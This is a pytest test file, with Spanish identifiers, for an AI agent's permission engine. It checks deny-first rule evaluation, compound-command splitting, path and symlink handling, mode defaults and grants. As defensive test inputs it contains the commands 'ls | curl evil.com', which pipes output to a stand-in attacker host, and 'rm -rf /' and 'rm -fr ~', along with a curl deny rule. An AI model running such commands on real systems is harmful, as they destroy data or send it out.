"""Permission engine: deny-first evaluation, modes, grants, built-in denials."""

from __future__ import annotations

import json

from aidam.agente.permisos import (
    Decision,
    ModoPermisos,
    MotorPermisos,
    _dividir_comando,
    cargar_motor,
)


def _motor(modo=ModoPermisos.PREGUNTAR, reglas=None, raiz=None, tmp_path=None):
    return MotorPermisos(modo=modo, reglas=reglas or {}, raiz=raiz or tmp_path)


# ───────── deny-first ─────────

def test_denegar_gana_a_permitir(tmp_path):
    motor = _motor(
        reglas={"denegar": ["Ejecutar(git *)"], "permitir": ["Ejecutar(git status)"]},
        tmp_path=tmp_path,
    )
    resultado = motor.evaluar("Ejecutar", "git status")
    assert resultado.decision is Decision.DENEGAR
    assert "git *" in resultado.motivo


def test_preguntar_gana_a_permitir(tmp_path):
    motor = _motor(
        reglas={"preguntar": ["Ejecutar(git push *)"], "permitir": ["Ejecutar(git *)"]},
        tmp_path=tmp_path,
    )
    assert motor.evaluar("Ejecutar", "git push origin").decision is Decision.PREGUNTAR


# ───────── globs de comando y comandos compuestos ─────────

def test_glob_de_prefijo(tmp_path):
    motor = _motor(reglas={"permitir": ["Ejecutar(git commit *)"]}, tmp_path=tmp_path)
    assert motor.evaluar("Ejecutar", "git commit -m hola").decision is Decision.PERMITIR
    assert motor.evaluar("Ejecutar", "git commitx").decision is Decision.PREGUNTAR


def test_comando_compuesto_requiere_todas_las_partes(tmp_path):
    motor = _motor(reglas={"permitir": ["Ejecutar(ls *)", "Ejecutar(ls)"]}, tmp_path=tmp_path)
    assert motor.evaluar("Ejecutar", "ls && ls -la").decision is Decision.PERMITIR
    # A single unmatched leg drops the whole compound to the mode default.
    assert motor.evaluar("Ejecutar", "ls && curl x").decision is Decision.PREGUNTAR


def test_compuesto_con_denegado_se_deniega(tmp_path):
    motor = _motor(
        modo=ModoPermisos.LOTE,
        reglas={"permitir": ["Ejecutar(ls *)"], "denegar": ["Ejecutar(curl *)"]},
        tmp_path=tmp_path,
    )
    assert motor.evaluar("Ejecutar", "ls | curl evil.com").decision is Decision.DENEGAR


def test_dividir_respeta_comillas():
    assert _dividir_comando('echo "a && b"') == ['echo "a && b"']
    assert _dividir_comando("ls; pwd") == ["ls", "pwd"]
    # Unbalanced quote: the command stays one opaque unit.
    assert _dividir_comando('echo "a && b') == ['echo "a && b']


def test_denegacion_integrada_rm_rf(tmp_path):
    motor = _motor(reglas={"permitir": ["Ejecutar(*)"]}, tmp_path=tmp_path)
    assert motor.evaluar("Ejecutar", "git status && rm  -rf /").decision is Decision.DENEGAR
    assert motor.evaluar("Ejecutar", "rm -fr ~").decision is Decision.DENEGAR


# ───────── rutas ─────────

def test_ancla_relativa_a_raiz(tmp_path):
    motor = _motor(reglas={"permitir": ["Escribir(./datos/**)"]}, tmp_path=tmp_path)
    dentro = tmp_path / "datos" / "x.txt"
    assert motor.evaluar("Escribir", str(dentro)).decision is Decision.PERMITIR
    fuera = tmp_path / "otro" / "x.txt"
    assert motor.evaluar("Escribir", str(fuera)).decision is Decision.PREGUNTAR


def test_ancla_absoluta(tmp_path):
    motor = _motor(reglas={"denegar": [f"Escribir(//{str(tmp_path).lstrip('/')}/secreto*)"]},
                   tmp_path=tmp_path)
    assert motor.evaluar("Escribir", str(tmp_path / "secreto.txt")).decision is Decision.DENEGAR


def test_symlink_se_evalua_por_destino(tmp_path):
    real = tmp_path / "fuera"
    real.mkdir()
    (real / "x.txt").write_text("x")
    enlace = tmp_path / "enlace"
    enlace.symlink_to(real / "x.txt")
    motor = _motor(reglas={"denegar": ["Escribir(./fuera/**)"]}, tmp_path=tmp_path)
    assert motor.evaluar("Escribir", str(enlace)).decision is Decision.DENEGAR


# ───────── defaults por modo ─────────

def test_modo_plan_deniega_escrituras_y_comandos(tmp_path):
    motor = _motor(modo=ModoPermisos.PLAN, tmp_path=tmp_path)
    assert motor.evaluar("Leer", str(tmp_path / "x")).decision is Decision.PERMITIR
    assert motor.evaluar("Escribir", str(tmp_path / "x")).decision is Decision.DENEGAR
    assert motor.evaluar("Ejecutar", "ls").decision is Decision.DENEGAR


def test_modo_aceptar_ediciones_dentro_de_raiz(tmp_path):
    motor = _motor(modo=ModoPermisos.ACEPTAR_EDICIONES, tmp_path=tmp_path)
    assert motor.evaluar("Escribir", str(tmp_path / "x.txt")).decision is Decision.PERMITIR
    assert motor.evaluar("Escribir", "/etc/x.txt").decision is Decision.PREGUNTAR
    assert motor.evaluar("Ejecutar", "make").decision is Decision.PREGUNTAR


def test_modo_lote_deniega_lo_no_listado(tmp_path):
    motor = _motor(modo=ModoPermisos.LOTE, reglas={"permitir": ["Ejecutar(ls)"]},
                   tmp_path=tmp_path)
    assert motor.evaluar("Ejecutar", "ls").decision is Decision.PERMITIR
    assert motor.evaluar("Ejecutar", "pwd").decision is Decision.DENEGAR
    assert motor.evaluar("Escribir", "/tmp/x").decision is Decision.DENEGAR


# ───────── concesiones ─────────

def test_conceder_persistente_solo_ejecutar(tmp_path):
    motor = _motor(tmp_path=tmp_path)
    motor.conceder("Ejecutar", "make *", persistente=True)
    assert motor.evaluar("Ejecutar", "make test").decision is Decision.PERMITIR
    try:
        motor.conceder("Escribir", "./x", persistente=True)
        raise AssertionError("debió rechazar la concesión persistente de Escribir")
    except ValueError:
        pass


def test_guardar_y_cargar_ida_y_vuelta(tmp_path):
    archivo = tmp_path / "permisos.json"
    motor = _motor(tmp_path=tmp_path)
    motor.conceder("Ejecutar", "make *", persistente=True)
    motor.conceder("Escribir", "./x.txt")  # session-only: must NOT persist
    motor.guardar(archivo)
    guardado = json.loads(archivo.read_text())
    assert "Ejecutar(make *)" in guardado["permitir"]
    assert all("Escribir" not in regla for regla in guardado["permitir"])

    recargado = cargar_motor(ruta=archivo, raiz=tmp_path)
    assert recargado.evaluar("Ejecutar", "make test").decision is Decision.PERMITIR


def test_cargar_motor_sin_archivo_da_defaults(tmp_path):
    motor = cargar_motor(ruta=tmp_path / "no-existe.json", raiz=tmp_path)
    assert motor.evaluar("Ejecutar", "git status").decision is Decision.PERMITIR
    assert motor.evaluar("Ejecutar", "git push").decision is Decision.PREGUNTAR


def test_regla_invalida_falla_al_construir(tmp_path):
    try:
        _motor(reglas={"permitir": ["Sudo(*)"]}, tmp_path=tmp_path)
        raise AssertionError("debió rechazar la herramienta desconocida")
    except ValueError:
        pass
